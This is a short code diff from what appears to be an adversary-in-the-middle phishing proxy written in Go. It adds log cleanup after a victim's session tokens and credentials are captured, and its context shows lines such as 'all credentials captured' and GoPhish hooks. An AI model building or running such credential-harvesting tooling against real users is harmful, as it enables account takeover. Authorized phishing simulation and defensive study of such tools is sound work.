@@ -1222,6 +1222,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
 							log.Error("database: %v", err)
 						}
+						p.db.DeleteInvalidLogsBySessionId(ps.SessionId)
 						s.Finish(false)
 
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -1378,6 +1379,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Warning("[%d] authorization completed, but no redirect_url is set for the lure - victim will not be redirected", ps.Index)
 						}
 						log.Success("[%d] authorization completed - all credentials captured", ps.Index)
+						p.db.DeleteInvalidLogsBySessionId(ps.SessionId)
 						s.Finish(true)
 					}
 
